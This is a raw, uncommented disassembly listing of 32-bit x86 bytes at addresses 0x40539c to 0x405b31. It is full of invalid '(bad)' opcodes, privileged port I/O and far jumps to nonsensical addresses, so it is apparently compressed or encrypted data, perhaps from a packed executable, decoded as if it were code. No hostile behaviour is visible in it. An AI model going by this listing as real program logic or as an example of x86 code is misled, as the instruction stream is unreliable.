  40539c:	mov    ebp,es
  40539e:	and    al,0x67
  4053a0:	cld    
  4053a1:	jnp    0x405422
  4053a3:	repz out 0xc4,eax
  4053a6:	ja     0x40540d
  4053a8:	xchg   esp,eax
  4053a9:	sar    dh,1
  4053ab:	add    ebx,DWORD PTR [ecx-0xb]
  4053ae:	cmp    DWORD PTR [eax+0x30],ebp
  4053b1:	stc    
  4053b2:	jb     0x40542a
  4053b4:	fcom   DWORD PTR [ebp+0xb3235ef]
  4053ba:	mov    eax,ds:0x1b535306
  4053bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053c0:	cmp    BYTE PTR [eax],dl
  4053c2:	xchg   BYTE PTR [ebp+0x4a45b9f4],ah
  4053c8:	or     dh,BYTE PTR [ebx+ebp*8-0x2e27b53c]
  4053cf:	xchg   ecx,eax
  4053d0:	jecxz  0x4053f1
  4053d2:	and    BYTE PTR [ebx],ch
  4053d4:	cwde   
  4053d5:	pushf  
  4053d6:	mov    es,WORD PTR [ebx+ebp*1-0x2]
  4053da:	pop    ss
  4053db:	xchg   DWORD PTR [ecx-0x7e],esp
  4053de:	cwde   
  4053df:	push   eax
  4053e0:	jl     0x405416
  4053e2:	lahf   
  4053e3:	jne    0x40537d
  4053e5:	or     edi,DWORD PTR [edx+0x44]
  4053e8:	jl     0x405427
  4053ea:	inc    esi
  4053eb:	xor    DWORD PTR [ecx],0xa271e5ec
  4053f1:	cmp    eax,0xaaa07227
  4053f6:	popa   
  4053f7:	cmp    cl,BYTE PTR [ecx+0x7b]
  4053fa:	push   edx
  4053fb:	xchg   ecx,eax
  4053fc:	mov    ah,0x31
  4053fe:	bswap  esi
  405400:	fisttp DWORD PTR [esi-0x4ed01181]
  405406:	xchg   ecx,eax
  405407:	fsubr  st(4),st
  405409:	nop
  40540a:	ja     0x4053d3
  40540c:	adc    esp,DWORD PTR [ecx-0x2b]
  40540f:	je     0x405481
  405411:	imul   eax,DWORD PTR [edi],0x6
  405414:	leave  
  405415:	sti    
  405416:	add    BYTE PTR [edx],dh
  405418:	aas    
  405419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40541a:	repz sub DWORD PTR [ecx+0x2befd93c],ecx
  405421:	int    0x14
  405423:	sbb    dh,BYTE PTR [esi+edi*4-0x67cad8ce]
  40542a:	out    0x16,al
  40542c:	sub    al,0xaf
  40542e:	push   ds
  40542f:	xor    eax,0x4f3a374d
  405434:	mov    ds:0x15962442,eax
  405439:	dec    esp
  40543a:	jmp    0x4053e4
  40543c:	pop    ecx
  40543d:	je     0x4053c0
  40543f:	outs   dx,DWORD PTR ds:[esi]
  405440:	clc    
  405441:	jmp    0x40549c
  405443:	(bad)  [edx+esi*4-0x6b]
  405447:	sbb    eax,0xa9b1eb9b
  40544c:	rcr    DWORD PTR [ecx-0x7e],cl
  40544f:	lds    ecx,FWORD PTR ds:0x6ff23681
  405455:	ja     0x405448
  405457:	and    BYTE PTR [edx-0x49],bl
  40545a:	retf   
  40545b:	cmp    dl,0xc8
  40545e:	stc    
  40545f:	or     edx,esp
  405461:	dec    esi
  405462:	mov    WORD PTR [esi-0x9f9c469],ss
  405468:	push   ebp
  405469:	into   
  40546a:	pop    ebp
  40546b:	int3   
  40546c:	xor    al,0x25
  40546e:	(bad)
  405474:	adc    al,0x70
  405476:	ret    
  405477:	pop    eax
  405478:	mov    ds:0xb2bf1a1a,eax
  40547d:	mov    ebp,0xd76377b3
  405482:	and    ecx,DWORD PTR [edx-0x37]
  405485:	jbe    0x40541c
  405487:	loopne 0x40544c
  405489:	repz add al,0xd7
  40548c:	xchg   bh,cl
  40548e:	jne    0x4054ec
  405490:	push   ebx
  405491:	jmp    0x2c0000a6
  405496:	test   DWORD PTR [edi-0x2b],0xfc41e181
  40549d:	pop    es
  40549e:	mov    al,0x9
  4054a0:	retf   
  4054a1:	sub    eax,0xbd1a702f
  4054a6:	jno    0x405451
  4054a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054a9:	mov    al,ah
  4054ab:	adc    dl,BYTE PTR [ebx]
  4054ad:	cmp    esp,0x36
  4054b0:	call   FWORD PTR [edi]
  4054b2:	mov    ds:0x897034c2,al
  4054b7:	ins    DWORD PTR es:[edi],dx
  4054b8:	cmp    esi,edx
  4054ba:	pop    esp
  4054bb:	and    DWORD PTR [ebx+ebx*2],esp
  4054be:	mov    ds:0x9013bbb5,eax
  4054c3:	sbb    bh,BYTE PTR [ebx]
  4054c5:	mov    DWORD PTR [esi+0x3b8eb026],ebx
  4054cb:	mov    edx,0x4a7db73a
  4054d0:	retf   
  4054d1:	push   esi
  4054d2:	mov    dh,0xd2
  4054d4:	pop    ebp
  4054d5:	es icebp 
  4054d7:	aas    
  4054d8:	retf   0x88b5
  4054db:	and    al,0xd
  4054dd:	out    dx,eax
  4054de:	jae    0x40553e
  4054e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054e1:	mov    dh,ch
  4054e3:	sbb    dh,dl
  4054e5:	or     DWORD PTR [esi+0x5d],ebx
  4054e8:	aam    0x9e
  4054ea:	inc    ebp
  4054eb:	(bad)  
  4054ec:	jle    0x4054dd
  4054ee:	xor    DWORD PTR [esi-0x15802a59],eax
  4054f4:	pop    es
  4054f5:	jb     0x40552f
  4054f7:	inc    eax
  4054f8:	mov    esp,?
  4054fa:	inc    eax
  4054fb:	(bad)  
  4054fc:	mov    edi,0x4ed0854a
  405501:	ds pop ebp
  405503:	xlat   BYTE PTR ds:[ebx]
  405504:	add    DWORD PTR es:[esi],ebp
  405507:	std    
  405508:	fwait
  405509:	cmp    esp,ebx
  40550b:	mov    dh,0xf7
  40550d:	inc    ebp
  40550e:	sbb    eax,0x1a5a44a9
  405513:	adc    eax,0x9531bd15
  405518:	xchg   esp,eax
  405519:	add    al,0x74
  40551b:	pushf  
  40551c:	jno    0x405507
  40551e:	mov    al,ds:0x42d72442
  405523:	inc    ebp
  405524:	add    al,0x52
  405526:	add    bl,BYTE PTR [ebp+0x2]
  405529:	sub    esi,edx
  40552b:	xor    BYTE PTR [edx-0x2d],dh
  40552e:	test   eax,0xd30acba1
  405533:	test   eax,edi
  405535:	mov    edi,0x1a7b8afb
  40553a:	je     0x405554
  40553c:	xchg   DWORD PTR [ebp-0x69fd1390],edi
  405542:	iret   
  405543:	xor    eax,0x5a4ccd72
  405548:	frstor [ebp-0x35]
  40554b:	sub    ch,BYTE PTR [ebx+0x75]
  40554e:	fcomp  DWORD PTR [edx]
  405550:	and    ah,bl
  405552:	and    DWORD PTR [esi-0x76f7ea2b],edx
  405558:	or     eax,ebx
  40555a:	lock jle 0x405542
  40555d:	cmp    al,0xca
  40555f:	(bad)  
  405560:	shr    bh,0x29
  405563:	jl     0x405538
  405565:	cdq    
  405566:	shr    DWORD PTR [edx-0x1736c362],0x6a
  40556d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556e:	xchg   edx,eax
  40556f:	call   0x3bc0:0xfc53cd4
  405576:	shr    BYTE PTR [eax],0x5a
  405579:	shl    DWORD PTR [ecx-0x75],cl
  40557c:	cli    
  40557d:	push   ecx
  40557e:	ret    
  40557f:	add    dl,bh
  405581:	fs daa 
  405583:	imul   esi,esp,0xcc2d08e3
  405589:	push   ss
  40558a:	lods   al,BYTE PTR ds:[esi]
  40558b:	inc    edi
  40558c:	fadd   QWORD PTR [esi]
  40558e:	int    0x92
  405590:	retf   
  405591:	add    esi,edx
  405593:	mov    ds:0x77f35c47,eax
  405598:	neg    DWORD PTR [esi-0x23]
  40559b:	xchg   BYTE PTR [edi+0x46],bl
  40559e:	stos   DWORD PTR es:[edi],eax
  40559f:	sbb    DWORD PTR [esi+0x68e5762f],esp
  4055a5:	aam    0x20
  4055a7:	add    DWORD PTR [ebx],edx
  4055a9:	fmul   st,st(2)
  4055ab:	out    0x1,al
  4055ad:	inc    edi
  4055ae:	inc    esp
  4055af:	xchg   BYTE PTR [ecx],cl
  4055b1:	mov    ebp,0x11a1f245
  4055b6:	mov    BYTE PTR [edx+edx*4+0xdc28f7e],0xb3
  4055be:	or     DWORD PTR [edx],ebx
  4055c0:	and    eax,0x68a690d5
  4055c5:	dec    ebx
  4055c6:	mov    ds:0x67434699,eax
  4055cb:	out    dx,al
  4055cc:	jae    0x405624
  4055ce:	ss hlt 
  4055d0:	mov    cl,0x33
  4055d2:	jg     0x405641
  4055d4:	mov    eax,0x6a98c524
  4055d9:	lds    ecx,FWORD PTR [ebx-0x47]
  4055dc:	adc    dh,bh
  4055de:	hlt    
  4055df:	fstp   QWORD PTR [eax+0x3a]
  4055e2:	mov    cs,esp
  4055e4:	or     cl,ah
  4055e6:	imul   esp,DWORD PTR [esi+0x34],0xfe97d688
  4055ed:	xor    BYTE PTR [edi-0x6e],dl
  4055f0:	push   0xffffff96
  4055f2:	aam    0x72
  4055f4:	call   FWORD PTR ds:[ecx+0x31]
  4055f8:	add    ah,BYTE PTR [ecx]
  4055fa:	pusha  
  4055fb:	sbb    ah,BYTE PTR [ebx]
  4055fd:	cmc    
  4055fe:	pusha  
  4055ff:	fst    QWORD PTR [edx]
  405601:	jle    0x4055cc
  405603:	sbb    DWORD PTR [edi],ecx
  405605:	push   0xfffffff2
  405607:	(bad)  
  405608:	or     esi,DWORD PTR [ebx]
  40560a:	hlt    
  40560b:	mov    dh,0x9f
  40560d:	(bad)  
  40560e:	push   ss
  40560f:	or     cl,cl
  405611:	gs pop ds
  405613:	dec    edi
  405614:	xchg   dl,bh
  405616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405617:	push   edi
  405618:	xchg   edi,eax
  405619:	jno    0x40564b
  40561b:	or     ebx,DWORD PTR [esi-0x552d4ae4]
  405621:	dec    ecx
  405622:	pushf  
  405623:	or     BYTE PTR [edx-0x2d],dh
  405626:	pusha  
  405627:	sbb    esi,DWORD PTR [ecx]
  405629:	test   ebp,esi
  40562b:	shr    BYTE PTR [ecx+0x5797d8de],1
  405631:	sbb    ecx,ebx
  405633:	imul   ebx,DWORD PTR [edx+ebp*8+0x5732542f],0xffffffbf
  40563b:	or     esi,0x95010cb0
  405641:	jge    0x405650
  405643:	sbb    BYTE PTR [edi-0x74],cl
  405646:	shl    ecx,1
  405648:	mov    es:0x5914e77e,eax
  40564e:	loop   0x405647
  405650:	jo     0x4055ee
  405652:	sbb    ecx,DWORD PTR [eax+0x7100e485]
  405658:	aad    0x12
  40565a:	adc    DWORD PTR [eax+0x4a],esp
  40565d:	jno    0x405694
  40565f:	pop    edx
  405660:	addr16 in al,dx
  405662:	add    eax,0x46b77a9c
  405667:	xchg   BYTE PTR [eax-0x62],ah
  40566a:	in     eax,0xb0
  40566c:	rcr    DWORD PTR [ebx-0x74],1
  40566f:	rcr    BYTE PTR [edx+0x77],0x2f
  405673:	sbb    al,0xfe
  405675:	gs add ebx,eax
  405678:	pop    edx
  405679:	jp     0x40569f
  40567b:	pop    esp
  40567c:	icebp  
  40567d:	lock pop ebx
  40567f:	xchg   edi,eax
  405680:	lahf   
  405681:	jle    0x405613
  405683:	mov    al,0xc2
  405685:	loop   0x40569e
  405687:	mov    al,ds:0xbf445a03
  40568c:	and    cl,bh
  40568e:	mov    ch,0x51
  405690:	in     al,0x92
  405692:	jb     0x4056e1
  405694:	or     BYTE PTR [eax+0x38],ch
  405697:	cld    
  405698:	fnstenv [ebp*8+0x5f074e42]
  40569f:	test   esi,ebx
  4056a1:	pop    edi
  4056a2:	dec    ecx
  4056a3:	mov    dl,0xc0
  4056a5:	lods   al,BYTE PTR ds:[esi]
  4056a6:	jbe    0x4056ae
  4056a8:	out    0x3e,eax
  4056aa:	fidivr WORD PTR [ebx-0x2b]
  4056ad:	pop    ebp
  4056ae:	gs push ebx
  4056b0:	and    ch,BYTE PTR [ebx]
  4056b2:	(bad)  
  4056b3:	retf   0xab0a
  4056b6:	jge    0x4056d0
  4056b8:	jnp    0x40569f
  4056ba:	(bad)  
  4056bb:	mov    al,0x1b
  4056bd:	pop    es
  4056be:	jbe    0x405641
  4056c0:	int    0xfe
  4056c2:	inc    edx
  4056c3:	pop    edi
  4056c4:	pop    ds
  4056c5:	outs   dx,BYTE PTR ds:[esi]
  4056c6:	out    0x16,al
  4056c8:	pop    edi
  4056c9:	pop    es
  4056ca:	push   edx
  4056cb:	adc    al,0xe2
  4056cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ce:	sahf   
  4056cf:	add    al,0x5
  4056d1:	jmp    0x5c6f0e50
  4056d6:	sbb    al,0x76
  4056d8:	std    
  4056d9:	dec    edx
  4056da:	cmp    al,BYTE PTR [eax]
  4056dc:	int3   
  4056dd:	mov    bh,0xa4
  4056df:	rcr    BYTE PTR [ebp-0x5a23988f],1
  4056e5:	pop    ecx
  4056e6:	jne    0x405679
  4056e8:	pop    ebx
  4056e9:	jle    0x405731
  4056eb:	adc    BYTE PTR [esi-0x8],ch
  4056ee:	xor    DWORD PTR [eax-0x54],esi
  4056f1:	xor    eax,0xed60a488
  4056f6:	pushf  
  4056f7:	aaa    
  4056f8:	mul    ebx
  4056fa:	pop    ss
  4056fb:	pushf  
  4056fc:	xchg   esp,eax
  4056fd:	cs sbb eax,0x2d8372ad
  405703:	push   ss
  405704:	and    ebp,DWORD PTR [esi+0x7f04cf6]
  40570a:	rcl    esi,cl
  40570c:	cmc    
  40570d:	add    ah,BYTE PTR [esi+ebx*8]
  405710:	mov    al,0x98
  405712:	jl     0x405752
  405714:	push   esi
  405715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405716:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405718:	cli    
  405719:	dec    ecx
  40571a:	and    BYTE PTR [edx-0x48],ch
  40571d:	ins    BYTE PTR es:[edi],dx
  40571e:	cmp    eax,0x8364edd5
  405723:	jmp    0x71cf9cb1
  405728:	fdivr  QWORD PTR [ebp+0x20]
  40572b:	pop    ss
  40572c:	retf   0x2c08
  40572f:	or     eax,DWORD PTR [ebp-0x53]
  405732:	mov    edx,0x4372897b
  405737:	inc    ebx
  405738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405739:	sub    edx,esi
  40573b:	mov    WORD PTR [ecx+0x51],ds
  40573e:	(bad)  
  405740:	dec    edi
  405741:	add    dl,BYTE PTR [eax+0x5]
  405744:	jb     0x4057ae
  405746:	dec    edi
  405747:	shr    ebx,1
  405749:	or     eax,0x408258a9
  40574e:	and    esp,edx
  405750:	loope  0x4057b3
  405752:	dec    edi
  405753:	popf   
  405754:	iret   
  405755:	sub    bh,BYTE PTR [edx]
  405757:	inc    ecx
  405758:	test   DWORD PTR [ecx+0x47086a4b],ebx
  40575e:	lods   eax,DWORD PTR ds:[esi]
  40575f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405760:	dec    edx
  405761:	bound  ecx,QWORD PTR [eax+ebp*4]
  405764:	shl    BYTE PTR [ecx+0x21],1
  405767:	xor    esi,esi
  405769:	je     0x405731
  40576b:	lock cmp edx,DWORD PTR [ebp-0x1a]
  40576f:	inc    eax
  405770:	lahf   
  405771:	out    dx,al
  405772:	fidivr DWORD PTR [ebp+0x56301b1f]
  405778:	sbb    bl,BYTE PTR [ecx]
  40577a:	(bad)  
  40577b:	pusha  
  40577c:	cld    
  40577d:	xchg   ebx,eax
  40577e:	xchg   edx,eax
  40577f:	push   ds
  405780:	mov    ebx,0xe2886a3a
  405785:	(bad)  
  405786:	in     eax,dx
  405787:	jmp    0x830c:0xe3787d0
  40578e:	xchg   edi,eax
  40578f:	mov    ecx,0x8486c5f1
  405794:	in     eax,dx
  405795:	nop
  405796:	sub    eax,0x7d209975
  40579b:	outs   dx,DWORD PTR ds:[esi]
  40579c:	jmp    DWORD PTR [ebx]
  40579f:	dec    esi
  4057a0:	data16 mov ah,0x88
  4057a3:	sub    DWORD PTR [eax],esi
  4057a5:	sbb    al,0xa3
  4057a7:	lock inc edx
  4057a9:	sbb    edx,esi
  4057ab:	sub    BYTE PTR [edx],0x9c
  4057ae:	push   edi
  4057af:	lahf   
  4057b0:	mov    DWORD PTR [edx-0x4bedfedf],0x80253771
  4057ba:	and    al,0x90
  4057bc:	loop   0x4057d9
  4057be:	mov    bl,0x18
  4057c0:	adc    eax,DWORD PTR [ebp-0x2e]
  4057c3:	ins    DWORD PTR es:[edi],dx
  4057c4:	mov    ch,0x49
  4057c6:	push   ebx
  4057c7:	in     al,dx
  4057c8:	dec    ecx
  4057c9:	cmc    
  4057ca:	dec    eax
  4057cb:	mov    eax,ds:0xc773bb3
  4057d0:	test   esi,edi
  4057d2:	imul   esi,DWORD PTR [eax+eax*1],0xffffff95
  4057d6:	jle    0x405790
  4057d8:	stos   BYTE PTR es:[edi],al
  4057d9:	jge    0x405847
  4057db:	sbb    al,0x7e
  4057dd:	rcr    BYTE PTR [ebx-0x4bdd0fd0],0xc3
  4057e4:	push   eax
  4057e5:	xchg   BYTE PTR [ebx+0x4f],cl
  4057e8:	adc    edi,DWORD PTR [ebx+0x17dd365f]
  4057ee:	add    dl,BYTE PTR [eax]
  4057f0:	or     edx,eax
  4057f2:	jmp    0x218a68be
  4057f7:	xor    eax,ebp
  4057f9:	xchg   DWORD PTR [edi],edx
  4057fb:	xchg   ecx,eax
  4057fc:	mov    ah,0xf
  4057fe:	cmp    DWORD PTR [ebx-0x2af6d36c],0x475936a9
  405808:	gs fiadd DWORD PTR cs:[edx]
  40580c:	xor    al,0x83
  40580e:	repnz call FWORD PTR [ecx*1-0x6aa684e]
  405816:	or     al,0xeb
  405818:	xchg   esi,eax
  405819:	stos   DWORD PTR es:[edi],eax
  40581a:	stc    
  40581b:	dec    ebx
  40581c:	jle    0x4057a0
  40581e:	xchg   ebp,eax
  40581f:	jns    0x405869
  405821:	dec    edi
  405822:	add    al,0xae
  405824:	sahf   
  405825:	outs   dx,BYTE PTR ds:[esi]
  405826:	sbb    al,0xf7
  405828:	jmp    0xe0577440
  40582d:	xchg   DWORD PTR [ebp-0x35],edx
  405830:	cld    
  405831:	pop    ebx
  405832:	cmp    al,0x18
  405834:	loopne 0x405875
  405836:	cmp    eax,0xbe0e0a5f
  40583b:	std    
  40583c:	or     ecx,DWORD PTR [edx+eax*1-0x336e8334]
  405843:	lods   al,BYTE PTR ds:[esi]
  405844:	cli    
  405845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405846:	mov    ebx,0xdd0995ad
  40584b:	outs   dx,DWORD PTR ds:[esi]
  40584c:	cdq    
  40584d:	hlt    
  40584e:	xchg   edi,eax
  40584f:	inc    ecx
  405850:	cmp    eax,edi
  405852:	xor    DWORD PTR [ecx+0x6deb11d7],edi
  405858:	jp     0x405840
  40585a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40585b:	cmc    
  40585c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40585e:	retf   0x489e
  405861:	mov    ah,0xc0
  405863:	xlat   BYTE PTR ds:[ebx]
  405864:	(bad)  
  405866:	cli    
  405867:	ret    0x9d2b
  40586a:	push   es
  40586b:	xchg   ebx,eax
  40586c:	shl    cl,1
  40586e:	ins    BYTE PTR es:[edi],dx
  40586f:	test   DWORD PTR [ebp-0x5d],0xc490292a
  405876:	push   0xfffffff0
  405878:	repz mov ch,BYTE PTR [ecx]
  40587b:	and    ah,BYTE PTR [edi+0x28d79a75]
  405881:	xchg   edi,eax
  405882:	ret    0x703
  405885:	js     0x405887
  405887:	in     eax,0x4c
  405889:	hlt    
  40588a:	cmp    ch,cl
  40588c:	ins    DWORD PTR es:[edi],dx
  40588d:	mov    cl,0x6b
  40588f:	hlt    
  405890:	imul   edi,DWORD PTR [eax],0xc7e70004
  405896:	jbe    0x4058c6
  405898:	xor    eax,0x6af09e4b
  40589d:	dec    ebx
  40589e:	aad    0xee
  4058a0:	adc    ch,BYTE PTR [ebp-0x41a6a990]
  4058a6:	lea    esi,[edi]
  4058a8:	cmp    al,BYTE PTR [ebx+0x26]
  4058ab:	idiv   DWORD PTR [ebx-0x6c24117f]
  4058b1:	inc    edx
  4058b2:	dec    ebx
  4058b3:	jb     0x4058c0
  4058b5:	inc    eax
  4058b6:	pop    edi
  4058b7:	(bad)  
  4058b8:	sbb    al,0xab
  4058ba:	pop    ss
  4058bb:	ret    
  4058bc:	xchg   BYTE PTR [eax],ah
  4058be:	xchg   edx,eax
  4058bf:	push   cx
  4058c1:	inc    ecx
  4058c2:	and    eax,0x10fc04de
  4058c7:	fcomip st,st(0)
  4058c9:	pop    ecx
  4058ca:	test   DWORD PTR [esi+0x2a1324cc],0x66d25fd1
  4058d4:	fwait
  4058d5:	loopne 0x4058f9
  4058d7:	mov    al,ds:0xbaddfcb8
  4058dc:	adc    eax,0xcbe55952
  4058e1:	stc    
  4058e2:	les    edi,FWORD PTR [edi+eax*8]
  4058e5:	xchg   edi,eax
  4058e6:	add    ch,BYTE PTR [edx]
  4058e8:	fwait
  4058e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ea:	mov    dl,0xb4
  4058ec:	jmp    0x58f6:0x363a82d9
  4058f3:	xor    eax,0xf28158b
  4058f8:	cmp    BYTE PTR [edx-0xb46bed8],al
  4058fe:	scas   eax,DWORD PTR es:[edi]
  4058ff:	xchg   ecx,eax
  405900:	adc    DWORD PTR ds:0x366d23c3,esi
  405906:	daa    
  405907:	inc    esp
  405908:	pop    es
  405909:	mov    edx,0x3b4294f0
  40590e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590f:	mov    eax,ds:0x31a80ea9
  405914:	shl    DWORD PTR [edx],cl
  405916:	and    ecx,ecx
  405918:	mov    ecx,0xe5ef0f8b
  40591d:	mov    dl,0xa5
  40591f:	xor    dl,BYTE PTR [edx+0x23]
  405922:	cmp    al,0x48
  405924:	mov    bh,0xc8
  405926:	xchg   edx,eax
  405927:	xchg   edi,eax
  405928:	jmp    0x405943
  40592a:	sbb    ebx,DWORD PTR [ecx]
  40592c:	push   edx
  40592d:	adc    edx,DWORD PTR [esi]
  40592f:	fiadd  WORD PTR [ebx]
  405931:	mov    ecx,0x454e07bd
  405936:	fidivr WORD PTR [edx+0x56]
  405939:	(bad)  [edx-0x54842f98]
  40593f:	xchg   esi,eax
  405940:	mov    ds:0xcb60b266,eax
  405945:	pop    ebp
  405946:	mov    BYTE PTR [ebx+0x1265b11e],0xcb
  40594d:	push   ds
  40594e:	aam    0x9
  405950:	in     al,0xb2
  405952:	push   0x27
  405954:	in     eax,dx
  405955:	add    al,BYTE PTR [ecx]
  405957:	pop    es
  405958:	push   esi
  405959:	add    ebp,DWORD PTR [esi-0x15]
  40595c:	(bad)  
  40595d:	xor    esp,DWORD PTR [eax]
  40595f:	mov    ch,0x8f
  405961:	sub    eax,0xa1200254
  405966:	or     eax,0x600cebde
  40596b:	sub    BYTE PTR [edx],0x44
  40596e:	popf   
  40596f:	jcxz   0x40598a
  405972:	dec    edx
  405973:	inc    ebx
  405974:	loopne 0x4058f9
  405976:	xchg   DWORD PTR [ebx+esi*4],edx
  405979:	fisttp QWORD PTR ds:0xb95e319c
  40597f:	retf   
  405980:	mov    ebp,0x2053a2fc
  405985:	stos   DWORD PTR es:[edi],eax
  405986:	shl    DWORD PTR [edx],cl
  405988:	pop    esi
  405989:	cmc    
  40598a:	add    al,0x6a
  40598c:	fdiv   QWORD PTR ds:0x99cb9ad4
  405992:	mov    eax,ds:0x738ef5b0
  405997:	in     eax,0x7d
  405999:	les    edx,FWORD PTR [ebx+0x50]
  40599c:	mov    eax,cs
  40599e:	xchg   esp,eax
  40599f:	ret    
  4059a0:	sbb    ecx,esi
  4059a2:	fiadd  DWORD PTR [ecx-0x4eb3d75b]
  4059a8:	sbb    ebp,eax
  4059aa:	xlat   BYTE PTR ds:[ebx]
  4059ab:	mov    al,0x25
  4059ad:	mov    edi,DWORD PTR cs:[ebp-0x5df3f70]
  4059b4:	dec    esp
  4059b5:	mov    al,0x28
  4059b7:	scas   eax,DWORD PTR es:[edi]
  4059b8:	jo     0x405a28
  4059ba:	push   ebx
  4059bb:	jmp    0x405983
  4059bd:	imul   esi,eax,0x45
  4059c0:	xor    eax,0xff702eef
  4059c5:	mov    ebx,0x982780b1
  4059ca:	(bad)
  4059ce:	inc    edx
  4059cf:	scas   eax,DWORD PTR es:[edi]
  4059d0:	dec    esi
  4059d1:	pop    ss
  4059d2:	out    dx,eax
  4059d3:	adc    ch,dl
  4059d5:	sub    al,0xf1
  4059d7:	inc    ebp
  4059d8:	repz (bad) 
  4059da:	dec    esp
  4059db:	sar    bh,1
  4059dd:	push   ebx
  4059de:	imul   edx,DWORD PTR [ebp+0x6456a776],0x6a17e3ab
  4059e8:	(bad)  
  4059e9:	stc    
  4059ea:	hlt    
  4059eb:	jnp    0x405a46
  4059ed:	add    DWORD PTR [esi-0x7b031d74],0x3d3dfc55
  4059f7:	dec    ebx
  4059f8:	inc    ebp
  4059f9:	dec    ebx
  4059fa:	xchg   ebp,eax
  4059fb:	rol    BYTE PTR [edx-0x1246152d],0x6f
  405a02:	das    
  405a03:	jle    0x4059fc
  405a05:	aam    0x34
  405a07:	test   BYTE PTR [edi-0x6b67f138],dl
  405a0d:	xchg   edx,eax
  405a0e:	dec    ecx
  405a0f:	xchg   ebx,eax
  405a10:	cmp    al,0xa6
  405a12:	lahf   
  405a13:	call   0x910ab938
  405a18:	mov    bl,0x73
  405a1a:	imul   esp,DWORD PTR [ecx-0x49]
  405a1e:	adc    al,0xa3
  405a20:	cmovl  esi,esp
  405a23:	rcr    BYTE PTR [ecx],1
  405a25:	shl    DWORD PTR [esi],1
  405a27:	pop    esp
  405a28:	xchg   esi,eax
  405a29:	js     0x4059dc
  405a2b:	xchg   BYTE PTR [edx-0x2f],dh
  405a2e:	dec    esp
  405a2f:	sbb    eax,0x219c0a54
  405a34:	enter  0xc54d,0xa
  405a38:	popf   
  405a39:	mov    al,0xcb
  405a3b:	call   0x895ce591
  405a40:	stc    
  405a41:	xor    BYTE PTR [ebx],bh
  405a43:	out    dx,al
  405a44:	lock div bl
  405a47:	mov    edx,0xae0d94d2
  405a4c:	(bad)  
  405a4e:	xchg   ebp,eax
  405a4f:	cmp    esp,DWORD PTR [ecx+0x6d]
  405a52:	(bad)  
  405a54:	push   eax
  405a55:	in     eax,dx
  405a56:	add    esi,DWORD PTR [ecx]
  405a58:	xchg   esp,eax
  405a59:	sbb    al,0x82
  405a5b:	int    0xa4
  405a5d:	or     ah,BYTE PTR [ebx]
  405a5f:	push   0x32c8ac5f
  405a64:	daa    
  405a65:	imul   edx,DWORD PTR [ebx],0x9b84bb9
  405a6b:	or     bh,0x53
  405a6e:	add    eax,0xc04d85ac
  405a73:	adc    bl,BYTE PTR [edi+0x408d991]
  405a79:	mov    ah,0x65
  405a7b:	in     eax,0x53
  405a7d:	mov    ah,0x7a
  405a7f:	jg     0x405a9f
  405a81:	inc    edi
  405a82:	and    eax,0x5ac4a4f6
  405a87:	mov    dh,0xa6
  405a89:	sub    BYTE PTR fs:[esi+0x5eb44704],dl
  405a90:	in     eax,dx
  405a91:	sbb    al,0xaa
  405a93:	mov    esi,0x762262f
  405a98:	ret    0xac08
  405a9b:	clc    
  405a9c:	and    edi,DWORD PTR [esi+0x137a1fd3]
  405aa2:	pop    ds
  405aa3:	jmp    0x405a7c
  405aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aa6:	inc    edx
  405aa7:	sbb    esi,esp
  405aa9:	cdq    
  405aaa:	jae    0x405a8a
  405aac:	xchg   edx,eax
  405aad:	daa    
  405aae:	xchg   DWORD PTR [ecx+0x7d],ebx
  405ab1:	cdq    
  405ab2:	sub    dh,BYTE PTR [ebx-0x64]
  405ab5:	ret    
  405ab6:	fsubrp st(3),st
  405ab8:	sbb    DWORD PTR [ecx-0x78],edi
  405abb:	dec    ebp
  405abc:	jb     0x405ae6
  405abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405abf:	das    
  405ac0:	(bad)
  405ac3:	pop    es
  405ac4:	xchg   edx,eax
  405ac5:	mov    dh,0xce
  405ac7:	inc    esp
  405ac8:	mov    eax,0x52f26ebb
  405acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ace:	cdq    
  405acf:	stos   BYTE PTR es:[edi],al
  405ad0:	add    BYTE PTR [ebx-0x72],0x83
  405ad4:	inc    ebp
  405ad5:	out    0xe0,al
  405ad7:	ds repnz addr16 or ax,0x8f14
  405ade:	xor    DWORD PTR [ebx+0x712699b2],ebx
  405ae4:	out    dx,al
  405ae5:	dec    edi
  405ae6:	addr16 popf 
  405ae8:	add    edi,esi
  405aea:	jb     0x405aad
  405aec:	mov    al,ds:0xc7fe5ac8
  405af1:	add    eax,0xdd4c130f
  405af6:	lock or al,0xad
  405af9:	cmp    edi,DWORD PTR [ebx+ecx*1+0x5865c802]
  405b00:	inc    eax
  405b01:	lds    ebp,FWORD PTR [eax-0x28c16d9d]
  405b07:	call   0x4c11:0x3a9ffa5c
  405b0e:	stc    
  405b0f:	xchg   ecx,eax
  405b10:	cmp    BYTE PTR [ebp+ebp*4+0x4e],bl
  405b14:	add    bl,bh
  405b16:	imul   esp,DWORD PTR [edx],0x2a
  405b19:	arpl   WORD PTR [ecx+eiz*2-0x5d],dx
  405b1d:	mov    cl,BYTE PTR [ecx-0x6d]
  405b20:	test   bl,al
  405b22:	cmp    eax,0x3c713d7b
  405b27:	jmp    0x405b92
  405b29:	iret   
  405b2a:	mov    bl,0x8
  405b2c:	and    ch,BYTE PTR [ebp+0x5]
  405b2f:	pusha  
  405b30:	dec    ecx
  405b31:	sbb    edi,DWORD PTR [edx]
